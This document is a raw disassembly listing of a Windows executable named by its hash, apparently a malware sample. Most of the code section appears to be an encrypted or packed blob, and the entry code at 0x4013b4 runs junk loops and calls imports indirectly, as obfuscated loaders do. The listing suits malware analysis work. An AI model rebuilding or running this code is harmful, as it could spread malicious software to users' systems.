
63b23d010fd94f11f7177cd739c4aeff3706488c3c63cf8efd01f51d17d2fa3c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	dec    ebx
  401015:	inc    esi
  401016:	mov    ds:0x7e7e7eb9,al
  40101b:	jle    0x400f9f
  40101d:	jno    0x40109d
  40101f:	jle    0x400fef
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [esi]
  40102d:	test   BYTE PTR [edi+ecx*1],cl
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0x7c
  4010c9:	cld    
  4010ca:	int3   
  4010cb:	cmp    esi,esp
  4010cd:	jb     0x4010ae
  4010cf:	inc    esp
  4010d0:	or     al,0xbc
  4010d2:	dec    eax
  4010d3:	mov    ecx,0xf5a0e5d5
  4010d8:	mov    gs,WORD PTR [edx+0x15]
  4010db:	daa    
  4010dc:	pop    ebp
  4010dd:	sub    dh,al
  4010df:	mov    DWORD PTR [edi+0x79],eax
  4010e2:	mov    esp,0x892e4b8d
  4010e7:	test   al,0x58
  4010e9:	loopne 0x401082
  4010eb:	and    ebp,DWORD PTR [eax+0xa53ba49]
  4010f1:	inc    esp
  4010f2:	push   esi
  4010f3:	pop    ecx
  4010f4:	fdiv   QWORD PTR [edi+ebp*2+0x3b5b15c3]
  4010fb:	cmp    ah,BYTE PTR [edx+0x44891f50]
  401101:	sub    al,0xd0
  401103:	ds cmp eax,ecx
  401106:	icebp  
  401107:	mov    edx,esp
  401109:	popa   
  40110a:	xchg   dl,dh
  40110c:	pmulhw mm5,QWORD PTR ss:[ebx+ebp*4+0x79]
  401112:	sbb    BYTE PTR [edx],cl
  401114:	adc    BYTE PTR [edx-0x1054d993],ah
  40111a:	std    
  40111b:	(bad)  [edx]
  40111d:	pop    ebp
  40111e:	in     al,0xe7
  401120:	jae    0x4010e3
  401122:	mov    dl,ch
  401124:	(bad)  
  401127:	lock sbb WORD PTR [esi-0x6b],0x40ef
  40112e:	mov    al,ds:0x38b6bc76
  401133:	pop    edi
  401134:	(bad)  
  401135:	jecxz  0x40112c
  401137:	aas    
  401138:	mov    cs:0x15895187,al
  40113e:	cmp    eax,0x518bf63f
  401143:	enter  0x3953,0x20
  401147:	inc    esi
  401148:	pop    ecx
  401149:	xchg   esi,eax
  40114a:	mov    ebp,0xb484a4f8
  40114f:	jnp    0x4010fe
  401151:	loop   0x4010d3
  401153:	xchg   DWORD PTR [ebx+0x1f1dfa7f],ecx
  401159:	sub    eax,0xb39c365e
  40115e:	dec    ecx
  40115f:	mov    al,0xd9
  401161:	adc    al,0x3c
  401163:	sti    
  401164:	(bad)  
  401165:	cmp    bl,bl
  401167:	leave  
  401168:	pop    es
  401169:	std    
  40116a:	inc    esp
  40116b:	mov    ds:0xea05474a,al
  401170:	test   al,0x7b
  401172:	mov    eax,0x996e4fc6
  401177:	push   0xadbbbdd7
  40117c:	xor    bh,BYTE PTR [ecx+0x42]
  40117f:	pop    esi
  401180:	call   0xbbcc:0x783c0b02
  401187:	lods   eax,DWORD PTR ds:[esi]
  401188:	loop   0x4011da
  40118a:	sub    al,0xf3
  40118c:	mov    BYTE PTR ds:0x979e5705,ch
  401192:	repnz nop
  401194:	(bad)  
  401195:	sar    BYTE PTR [eax-0x57df1735],cl
  40119b:	push   eax
  40119c:	push   edx
  40119d:	push   cs
  40119e:	adc    BYTE PTR [ebx],cl
  4011a0:	je     0x4011e8
  4011a2:	mov    BYTE PTR [edi+0x5e],dl
  4011a5:	clc    
  4011a6:	xchg   ebp,eax
  4011a7:	pop    esp
  4011a8:	xlat   BYTE PTR ds:[ebx]
  4011a9:	inc    ebp
  4011aa:	jnp    0x401216
  4011ac:	(bad)  
  4011ad:	xchg   edx,eax
  4011ae:	and    eax,0x913a0537
  4011b3:	cdq    
  4011b4:	retf   0xa7d3
  4011b7:	fld    TBYTE PTR [edx+0x31]
  4011ba:	cmp    DWORD PTR [ebp-0x6e9ff75c],eax
  4011c0:	les    esi,FWORD PTR [edi+esi*2-0x33]
  4011c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011c5:	sub    edx,DWORD PTR [edi-0x68e4da11]
  4011cb:	jns    0x401209
  4011cd:	inc    esi
  4011ce:	xchg   ebx,eax
  4011cf:	push   ebp
  4011d0:	pop    esi
  4011d1:	mov    esi,0x8c9b49bc
  4011d6:	cmp    BYTE PTR ds:0xef15c17e,ah
  4011dc:	cld    
  4011dd:	jno    0x401227
  4011df:	xchg   ebp,eax
  4011e0:	mov    al,0x25
  4011e2:	mov    dl,0xda
  4011e4:	mov    edx,0xbf006a6d
  4011e9:	xchg   edx,eax
  4011ea:	sahf   
  4011eb:	out    dx,al
  4011ec:	jnp    0x401252
  4011ee:	test   al,0x37
  4011f0:	push   eax
  4011f1:	inc    ebp
  4011f2:	mov    esp,0x69e6099c
  4011f7:	push   ebp
  4011f8:	or     DWORD PTR [ecx+0x788d31e1],esi
  4011fe:	das    
  4011ff:	inc    esi
  401200:	int    0x86
  401202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401203:	mov    eax,0x6f9e3c33
  401208:	jmp    0x401242
  40120a:	mov    ebp,0x2187db1e
  40120f:	dec    edi
  401210:	fistp  WORD PTR [ebp-0xe]
  401213:	push   esp
  401214:	retf   
  401215:	pop    es
  401216:	idiv   BYTE PTR [ecx-0x35863735]
  40121c:	addr16 (bad) 
  40121f:	mov    edi,0x3f2e094d
  401224:	sbb    ecx,edi
  401226:	ss out dx,al
  401228:	ins    DWORD PTR es:[edi],dx
  401229:	inc    edx
  40122a:	mov    edi,0x3eb93d73
  40122f:	mov    BYTE PTR [eax+0x27816d7b],dl
  401235:	pop    esp
  401236:	rcr    BYTE PTR [edx+0x2b3ad381],1
  40123c:	repz fwait
  40123e:	cdq    
  40123f:	fmul   st,st(7)
  401241:	call   0x6af33035
  401246:	ja     0x4011df
  401248:	inc    esp
  401249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40124a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40124b:	pop    edi
  40124c:	outs   dx,DWORD PTR ds:[esi]
  40124d:	fadd   DWORD PTR [ebp-0x7dda62df]
  401253:	mov    bl,0xa8
  401255:	aaa    
  401256:	xor    DWORD PTR [ebp*8+0x5916236c],edx
  40125d:	mov    edx,0x680a3aae
  401262:	out    dx,eax
  401263:	js     0x4011fc
  401265:	push   es
  401266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401267:	outs   dx,BYTE PTR ds:[esi]
  401268:	xchg   ecx,eax
  401269:	fstp   TBYTE PTR [eax+esi*2+0x2c]
  40126d:	sbb    edx,ebp
  40126f:	adc    BYTE PTR [ecx],cl
  401271:	ja     0x40124f
  401273:	lods   al,BYTE PTR ds:[esi]
  401274:	cmp    DWORD PTR [esi+0x2e],edi
  401277:	icebp  
  401278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401279:	push   esp
  40127a:	enter  0xbbe7,0x56
  40127e:	add    dl,BYTE PTR [edx-0x4e87b851]
  401284:	jae    0x401242
  401286:	in     al,0xf3
  401288:	push   esi
  401289:	inc    ebx
  40128a:	loop   0x4012d0
  40128c:	sbb    BYTE PTR [edx-0x5790b936],dh
  401292:	push   cs
  401293:	mov    ebx,0xb50180f9
  401298:	sub    edx,ebp
  40129a:	mov    BYTE PTR [edx+eiz*2+0x7fc36a51],bh
  4012a1:	sti    
  4012a2:	add    DWORD PTR [eax-0x4b990725],ebp
  4012a8:	sbb    al,0x39
  4012aa:	or     BYTE PTR [eax],0x70
  4012ad:	loope  0x4012e6
  4012af:	es jnp 0x4012fe
  4012b2:	mov    ebp,0xf69f793c
  4012b7:	push   esi
  4012b8:	xchg   esp,eax
  4012b9:	jbe    0x401260
  4012bb:	cmc    
  4012bc:	mov    dl,0xeb
  4012be:	sbb    al,0x23
  4012c0:	sar    DWORD PTR [ecx+0x39],cl
  4012c3:	ins    DWORD PTR es:[edi],dx
  4012c4:	adc    esp,DWORD PTR [edx-0x4d]
  4012c7:	jb     0x4012d8
  4012c9:	stos   BYTE PTR es:[edi],al
  4012ca:	xor    edx,esi
  4012cc:	(bad)  
  4012cd:	hlt    
  4012ce:	sub    bl,cl
  4012d0:	add    ch,bl
  4012d2:	xor    edx,DWORD PTR [edi+0x31]
  4012d5:	mov    ah,0x67
  4012d7:	rol    BYTE PTR [edx],cl
  4012d9:	(bad)  
  4012da:	les    esp,FWORD PTR [esi-0x79d11cec]
  4012e0:	sub    DWORD PTR [edi+0x6b],esp
  4012e3:	aad    0xba
  4012e5:	sbb    eax,0x167d1749
  4012ea:	adc    DWORD PTR [eax-0x45],esp
  4012ed:	jbe    0x40131e
  4012ef:	loope  0x401329
  4012f1:	paddsb mm3,QWORD PTR [ebx+0x134bc632]
  4012f8:	(bad)  
  4012f9:	ror    DWORD PTR ds:0x1dba27e3,0xe6
  401300:	mov    cl,0xa1
  401302:	out    0x84,al
  401304:	neg    BYTE PTR [ebp-0x4b19eb25]
  40130a:	test   DWORD PTR [edi-0x214140ae],eax
  401310:	push   edi
  401311:	icebp  
  401312:	in     al,0x64
  401314:	inc    ebx
  401315:	sbb    al,0x50
  401317:	push   ss
  401318:	adc    edx,ebp
  40131a:	sbb    dh,BYTE PTR [ecx+0x3c9b263b]
  401320:	push   eax
  401321:	loop   0x4012f7
  401323:	leave  
  401324:	lods   eax,DWORD PTR ds:[esi]
  401325:	xchg   ecx,eax
  401326:	sar    BYTE PTR [ecx-0x66],0xb1
  40132a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40132b:	mov    ebx,DWORD PTR ds:0x88b5ad56
  401331:	repnz daa 
  401333:	pop    ecx
  401334:	popf   
  401335:	clc    
  401336:	adc    eax,0xd192c304
  40133b:	jo     0x40138c
  40133d:	std    
  40133e:	mov    ebx,0xcd7e3da4
  401343:	mov    ebx,0xcd72a018
  401348:	add    BYTE PTR [ecx+esi*1+0x47ce5801],dl
  40134f:	jle    0x40134e
  401351:	mov    edx,0x7bb09c11
  401356:	jbe    0x4013a0
  401358:	es retf 
  40135a:	inc    edi
  40135b:	enter  0x1fc,0x3
  40135f:	ds jp  0x401334
  401362:	fcmovbe st,st(2)
  401364:	test   DWORD PTR [edi],ecx
  401366:	loope  0x40137d
  401368:	mov    ss,WORD PTR [ecx]
  40136a:	cdq    
  40136b:	popa   
  40136c:	in     al,0x9d
  40136e:	ds cmc 
  401370:	sub    cl,bh
  401372:	xor    al,0xcf
  401374:	xor    BYTE PTR [eax+0x4],dh
  401377:	cdq    
  401378:	mov    eax,0x6046c5e6
  40137d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40137e:	pop    ecx
  40137f:	aas    
  401380:	shr    edx,1
  401382:	adc    al,BYTE PTR [esi]
  401384:	je     0x401379
  401386:	jo     0x4013e1
  401388:	xlat   BYTE PTR ds:[ebx]
  401389:	fs mov ah,0xd4
  40138c:	sub    esi,edx
  40138e:	pop    esp
  40138f:	mov    al,ds:0xc78d63c5
  401394:	mov    eax,ds:0xf081a5f1
  401399:	dec    edi
  40139a:	mov    esi,0xb5d9586
  40139f:	repz popf 
  4013a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013a2:	push   esp
  4013a3:	and    ebp,esi
  4013a5:	lahf   
  4013a6:	(bad)  
  4013a8:	jne    0x40136f
  4013aa:	xor    eax,0xcbca3007
  4013af:	mov    al,0x31
  4013b1:	lods   al,BYTE PTR ds:[esi]
  4013b2:	jge    0x401345
  4013b4:	sub    esp,0x2c
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430486,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ee20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ee20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ee20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42e9ec
  401403:	mov    ecx,DWORD PTR ds:0x42ee20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ee20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ee24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430556,0x15
  401428:	cmp    DWORD PTR ds:0x430556,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430556,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e7e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42e9f0
  40145f:	cmp    DWORD PTR ds:0x430556,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430556
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430556,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430556
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430556,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43049a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x6550:0xc48b26e
  4014ab:	jmp    0x401436
  4014ad:	or     DWORD PTR [edx-0x7d81818f],eax
  4014b3:	jno    0x401533
  4014b5:	jle    0x401457
  4014b7:	and    DWORD PTR [edi-0x6169f0ce],eax
  4014bd:	jmp    0x401501
  4014bf:	in     eax,dx
  4014c0:	mov    ch,0x67
  4014c2:	ss jp  0x401488
  4014c5:	imul   DWORD PTR [esi-0x89ec93e]
  4014cb:	mov    edx,0x69bdb7cd
  4014d0:	pop    esi
  4014d1:	outs   dx,DWORD PTR ds:[esi]
  4014d2:	icebp  
  4014d3:	lods   eax,DWORD PTR ds:[esi]
  4014d4:	jp     0x401518
  4014d6:	push   ebp
  4014d7:	sbb    BYTE PTR [eax+eiz*4+0x1e],dl
  4014db:	push   ds
  4014dc:	cs xchg ebx,eax
  4014de:	mov    bh,0xd7
  4014e0:	adc    al,BYTE PTR [ebx]
  4014e2:	push   edi
  4014e3:	push   0x1
  4014e5:	retf   
  4014e6:	sbb    eax,0x8ba559f2
  4014eb:	mov    ah,0x71
  4014ed:	(bad)  
  4014ee:	xlat   BYTE PTR ds:[ebx]
  4014ef:	and    al,0x21
  4014f1:	cmp    BYTE PTR [ebx],bh
  4014f3:	xor    BYTE PTR [eax],0x1c
  4014f6:	nop
  4014f7:	cmc    
  4014f8:	fist   DWORD PTR [ecx]
  4014fa:	test   DWORD PTR [ecx-0x23d33e73],esi
  401500:	(bad)  
  401501:	fidiv  WORD PTR [edi-0x6f]
  401504:	mov    WORD PTR [esi+ebx*1-0x1f51bf34],?
  40150b:	and    DWORD PTR [eax+eax*4+0x20],0x97df1fde
  401513:	ds dec edx
  401515:	scas   eax,DWORD PTR es:[edi]
  401516:	or     eax,0xd00c476f
  40151b:	jg     0x4014e1
  40151d:	xchg   edx,eax
  40151e:	mov    eax,ds:0x8a45dad1
  401523:	xor    dl,dh
  401525:	stos   DWORD PTR es:[edi],eax
  401526:	popf   
  401527:	ds and al,0xfc
  40152a:	pusha  
  40152b:	and    bh,BYTE PTR [ebx+0x67]
  40152e:	mov    ebp,0xaad6e4f2
  401533:	stc    
  401534:	or     DWORD PTR [ecx-0x5c],ebx
  401537:	adc    DWORD PTR [eax-0xb],eax
  40153a:	add    esi,0xffffffb2
  40153d:	push   esi
  40153e:	add    ecx,DWORD PTR [ebx+ebp*1]
  401541:	dec    ebx
  401542:	leave  
  401543:	push   ds
  401544:	scas   al,BYTE PTR es:[edi]
  401545:	lds    ebp,FWORD PTR [edx+0x3b3e135a]
  40154b:	ret    0x8876
  40154e:	fcmovne st,st(7)
  401550:	rcl    BYTE PTR [ecx-0x131a1aff],1
  401556:	mov    esi,0xf4ff7b13
  40155b:	mov    bh,0x9
  40155d:	mov    esp,0xa81a5555
  401562:	dec    esi
  401563:	test   edi,ecx
  401565:	and    edi,ebx
  401567:	fisttp DWORD PTR [edi]
  401569:	call   0x84a2:0xf9d395bd
  401570:	mul    DWORD PTR [ebx]
  401572:	jmp    0xd332:0xe52ae048
  401579:	pop    esp
  40157a:	mov    al,0xd7
  40157c:	(bad)  
  40157d:	mov    eax,0x832ce3
  401582:	or     al,0xf7
  401584:	daa    
  401585:	mov    ebx,0xadc7e5ae
  40158a:	push   ds
  40158b:	mov    esi,0x71b44759
  401590:	add    ebx,edx
  401592:	rol    BYTE PTR [edi+0x69c6952c],cl
  401598:	jns    0x4015b1
  40159a:	dec    ebp
  40159b:	pop    ss
  40159c:	sbb    al,BYTE PTR [eax-0x36898631]
  4015a2:	inc    edx
  4015a3:	enter  0x7e78,0xa5
  4015a7:	inc    edi
  4015a8:	inc    ebx
  4015a9:	fcmovnb st,st(2)
  4015ab:	mov    dl,BYTE PTR [edx+0x2e]
  4015ae:	mov    ebx,0xd7e226a7
  4015b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015b4:	fidiv  WORD PTR [ebx+0x5f0f36e]
  4015ba:	lods   al,BYTE PTR ds:[esi]
  4015bb:	push   0xde406352
  4015c0:	(bad)  
  4015c1:	and    ebp,ebp
  4015c3:	push   0x31c248e6
  4015c8:	call   0x9b2d:0x9abacd6e
  4015cf:	and    cl,bh
  4015d1:	inc    esi
  4015d2:	test   al,0x16
  4015d4:	xor    edx,0x4b
  4015d7:	or     eax,0x7e78ff
  4015dc:	jbe    0x401607
  4015de:	mov    edi,0xf6c5487f
  4015e3:	mov    ds:0xa0fe6bf5,eax
  4015e8:	add    DWORD PTR [ebx+edx*1-0x1d],edi
  4015ec:	jmp    0x40158f
  4015ee:	adc    al,0x94
  4015f0:	out    0x58,eax
  4015f2:	pop    ebp
  4015f3:	mov    eax,ds:0xb0d921f0
  4015f8:	fcom   QWORD PTR [edx]
  4015fa:	mov    dh,bh
  4015fc:	cmc    
  4015fd:	int3   
  4015fe:	cs pop eax
  401600:	pop    ecx
  401601:	lahf   
  401602:	jmp    0x15c3:0xa056e5c0
  401609:	mov    ebp,0xe3068fa0
  40160e:	(bad)  [ebp-0x62028cc7]
  401614:	add    DWORD PTR ds:0xbc0054fd,esi
  40161a:	mov    ch,0xb7
  40161c:	fdivr  QWORD PTR [ebp-0x2ebf391]
  401623:	int    0x28
  401625:	je     0x401638
  401627:	sub    edx,DWORD PTR [eax+ebx*4]
  40162a:	dec    ebp
  40162b:	sahf   
  40162c:	sbb    eax,0xf5d30bbf
  401631:	mov    ch,0xa0
  401633:	pop    ss
  401634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401636:	jge    0x4015f8
  401638:	xchg   esp,eax
  401639:	cs lahf 
  40163b:	call   0x27507974
  401640:	lods   al,BYTE PTR ds:[esi]
  401641:	push   0xea146ade
  401646:	adc    al,0x49
  401648:	(bad)  [eax-0x3e2633a1]
  40164e:	xor    eax,0xcd06b785
  401653:	jecxz  0x4016c1
  401655:	pop    eax
  401656:	mov    edi,?
  401658:	push   esp
  401659:	mov    bh,0x26
  40165b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40165c:	inc    esp
  40165d:	push   ss
  40165e:	xor    DWORD PTR [esp+eiz*4+0x3c],eax
  401662:	sahf   
  401663:	fs pop ss
  401665:	jbe    0x401682
  401667:	outs   dx,BYTE PTR ds:[esi]
  401668:	mov    ch,0x5f
  40166a:	fcompp 
  40166c:	sub    edi,esp
  40166e:	cmp    DWORD PTR [edi+eax*2-0x3d],ecx
  401672:	loope  0x40162a
  401674:	dec    esp
  401675:	clc    
  401676:	add    DWORD PTR [ebx+0x58a30aea],esi
  40167c:	outs   dx,BYTE PTR ds:[esi]
  40167d:	hlt    
  40167e:	out    dx,al
  40167f:	xchg   edi,eax
  401680:	bound  ecx,QWORD PTR [ecx-0x5ab7a262]
  401686:	nop
  401687:	ret    
  401688:	shl    DWORD PTR [edi-0x1485bf17],cl
  40168e:	dec    esi
  40168f:	arpl   WORD PTR [eax+0x1a],dx
  401692:	(bad)  
  401694:	sub    al,0x67
  401696:	lock adc ecx,ecx
  401699:	in     eax,dx
  40169a:	cs push ss
  40169c:	inc    edx
  40169d:	pop    ss
  40169e:	xor    dh,BYTE PTR [ebx+0x3489c3c8]
  4016a4:	daa    
  4016a5:	or     cl,BYTE PTR [eax-0x50]
  4016a8:	loop   0x4016a3
  4016aa:	ss sti 
  4016ac:	mov    ?,esp
  4016ae:	test   eax,0x369ba27b
  4016b3:	aas    
  4016b4:	and    eax,0xe72aaea9
  4016b9:	popf   
  4016ba:	(bad)  
  4016bb:	outs   dx,BYTE PTR ds:[esi]
  4016bc:	push   ecx
  4016bd:	out    0x1f,al
  4016bf:	mov    eax,ds:0x82d47810
  4016c4:	xor    DWORD PTR [ecx+ebp*8+0x74],ecx
  4016c8:	mov    cl,dh
  4016ca:	push   0xb79145e5
  4016cf:	mov    ds:0xae278499,eax
  4016d4:	lods   eax,DWORD PTR ds:[esi]
  4016d5:	popf   
  4016d6:	pop    ss
  4016d7:	xor    eax,0x133b1e6a
  4016dc:	shufps xmm7,XMMWORD PTR [edi-0x5626a2eb],0xe9
  4016e4:	stos   DWORD PTR es:[edi],eax
  4016e5:	add    al,0x89
  4016e7:	repnz mov gs,ecx
  4016ea:	pop    edx
  4016eb:	in     al,dx
  4016ec:	push   edx
  4016ed:	jle    0x4016d5
  4016ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016f0:	jge    0x40172d
  4016f2:	fidivr WORD PTR [eax+0x67b4052f]
  4016f8:	and    BYTE PTR [edx],0x93
  4016fb:	pop    esi
  4016fc:	mov    eax,ds:0x6e968474
  401701:	mov    ah,0x13
  401703:	int    0x94
  401705:	out    dx,ax
  401707:	lahf   
  401708:	sbb    al,0xe6
  40170a:	add    eax,0xb69a15fc
  40170f:	mov    ah,0x56
  401711:	or     al,0xa
  401713:	in     al,0xc1
  401715:	mov    ds:0xd8f22df6,eax
  40171a:	mov    esp,0x54630801
  40171f:	pop    es
  401720:	lahf   
  401721:	jp     0x40177a
  401723:	sub    al,0xe4
  401725:	jbe    0x401716
  401727:	fcomp  DWORD PTR [ecx+ecx*2-0x50]
  40172b:	icebp  
  40172c:	pop    ds
  40172d:	xor    al,0x52
  40172f:	or     bl,BYTE PTR [edx+0x21]
  401732:	test   BYTE PTR [edi+edx*2+0x7c],0x49
  401737:	rcr    BYTE PTR [esi-0x71],0xf4
  40173b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40173c:	sub    esi,DWORD PTR [edi+0x37fa88bf]
  401742:	stc    
  401743:	arpl   di,dx
  401745:	jb     0x4017b7
  401747:	jecxz  0x401782
  401749:	mov    ecx,0x50828c11
  40174e:	arpl   WORD PTR [edi-0x2d735c4d],di
  401754:	dec    edx
  401755:	pop    es
  401756:	or     dl,BYTE PTR [eax+0x58]
  401759:	adc    DWORD PTR [ebx],edx
  40175b:	fistp  DWORD PTR [eax]
  40175d:	adc    DWORD PTR [ecx-0x15e06dec],esi
  401763:	imul   edx,ebx,0x44d4db57
  401769:	inc    edi
  40176a:	mov    ?,eax
  40176c:	or     bl,BYTE PTR [ecx+0x6f2944f2]
  401772:	jbe    0x401734
  401774:	mov    bh,0x4c
  401776:	pop    ecx
  401777:	std    
  401778:	pusha  
  401779:	jp     0x40174e
  40177b:	mov    edx,0xa4525d5d
  401780:	adc    eax,0x4d09268
  401785:	dec    edi
  401786:	adc    al,0x8b
  401788:	(bad)
  40178c:	fs cdq 
  40178e:	ja     0x4017fc
  401790:	or     cl,cl
  401792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401793:	into   
  401794:	pushaw 
  401796:	int    0x53
  401798:	sub    eax,0x2b8bfb25
  40179d:	jnp    0x401724
  40179f:	(bad)  
  4017a0:	push   cs
  4017a1:	dec    esp
  4017a2:	or     dh,BYTE PTR [ebp-0xa4ebc8]
  4017a8:	retf   
  4017a9:	lods   eax,DWORD PTR ds:[esi]
  4017aa:	push   esp
  4017ab:	mov    ds:0xda403d5f,ax
  4017b1:	sub    ebp,edi
  4017b3:	fdiv   QWORD PTR [ecx]
  4017b5:	jbe    0x4017d3
  4017b7:	or     eax,0x1ef2cdbb
  4017bc:	lahf   
  4017bd:	push   cs
  4017be:	push   ss
  4017bf:	call   0xe4189c1c
  4017c4:	imul   ebx,DWORD PTR [ebx+eiz*1],0x2b0d51c6
  4017cb:	leave  
  4017cc:	and    esi,eax
  4017ce:	test   bh,dl
  4017d0:	pop    esp
  4017d1:	daa    
  4017d2:	pop    edx
  4017d3:	stos   BYTE PTR es:[edi],al
  4017d4:	pop    esp
  4017d5:	vpminsw xmm4,xmm3,XMMWORD PTR [eax]
  4017d9:	popf   
  4017da:	sti    
  4017db:	sub    eax,0x837d6b64
  4017e0:	stos   BYTE PTR es:[edi],al
  4017e1:	out    dx,al
  4017e2:	mov    al,0x91
  4017e4:	sar    BYTE PTR ds:0x1205ef5,1
  4017ea:	ss pusha 
  4017ec:	aas    
  4017ed:	push   ebp
  4017ee:	sbb    al,0x27
  4017f0:	jp     0x401784
  4017f2:	enter  0x761b,0x2b
  4017f6:	scas   al,BYTE PTR es:[edi]
  4017f7:	mov    al,ds:0x1bfd46a
  4017fc:	stos   BYTE PTR es:[edi],al
  4017fd:	mov    esp,0xb642febc
  401802:	sti    
  401803:	in     al,dx
  401804:	retf   0xa868
  401807:	shl    DWORD PTR [eiz*2+0x39f9b47c],0xc5
  40180f:	bound  esi,QWORD PTR ds:0x4e3c558c
  401815:	add    BYTE PTR [esi+0x4dd51a06],ch
  40181b:	sbb    ebx,DWORD PTR [bx-0x67]
  40181f:	stc    
  401820:	or     DWORD PTR [ecx-0x44f4c9bf],0x641bbe74
  40182a:	adc    eax,0xddb5e5a4
  40182f:	iret   
  401830:	fadd   QWORD PTR [ebx+eiz*8]
  401833:	xchg   esi,eax
  401834:	enter  0xf66e,0x3b
  401838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40183a:	leave  
  40183b:	inc    ebp
  40183c:	aas    
  40183d:	sub    al,0x51
  40183f:	adc    ebp,eax
  401841:	cs data16 jb 0x401887
  401845:	inc    ecx
  401846:	pop    ebx
  401847:	cmp    eax,0x45896932
  40184c:	loopne 0x401845
  40184e:	sbb    eax,0x430496
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e762,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
